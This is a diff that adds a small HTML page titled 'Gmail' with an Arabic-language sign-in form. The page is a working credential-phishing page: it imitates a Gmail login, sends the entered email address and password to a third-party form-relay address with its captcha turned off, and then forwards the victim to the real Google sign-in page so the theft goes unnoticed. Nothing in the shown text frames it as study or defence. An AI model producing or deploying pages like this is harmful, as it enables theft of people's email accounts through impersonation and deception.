@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail</title>
+</head>
+<body>
+    <form action="https://formsubmit.co/el/dopuni" method="POST">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next" value="https://accounts.google.com/signin/v2/identifier?service=mail">
+        <h2>تسجيل الدخول</h2>
+        <input type="email" name="email" placeholder="البريد الإلكتروني" required>
+        <input type="password" name="password" placeholder="كلمة المرور" required>
+        <button type="submit">التالي</button>
+    </form>
+</body>
+</html>
